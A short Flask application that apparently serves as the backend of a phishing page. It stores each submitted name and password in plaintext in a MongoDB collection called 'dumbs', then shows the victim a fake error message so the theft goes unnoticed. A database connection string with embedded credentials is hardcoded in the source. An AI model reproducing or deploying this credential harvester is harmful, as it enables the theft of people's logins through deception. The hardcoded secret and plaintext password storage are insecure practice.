from flask import Flask, render_template, request
import pymongo
app = Flask(__name__)


@app.route('/', methods=["POST", "GET"])
def index():
    if request.method == "POST":
        name = request.form['name']
        passwd = request.form['passwd']
        myclient = pymongo.MongoClient("mongodb+srv://mahmoud12345:mahmoud12345@cluster0.nnyn9.mongodb.net/?retryWrites=true&w=majority")
        mydb = myclient["myDatabase"]
        mycol = mydb["dumbs"]

        mydict = { "name": name, "pass": passwd }

        x = mycol.insert_one(mydict)
        return 'Erorr, Please try again later!'
    else:
        return render_template('index.html')
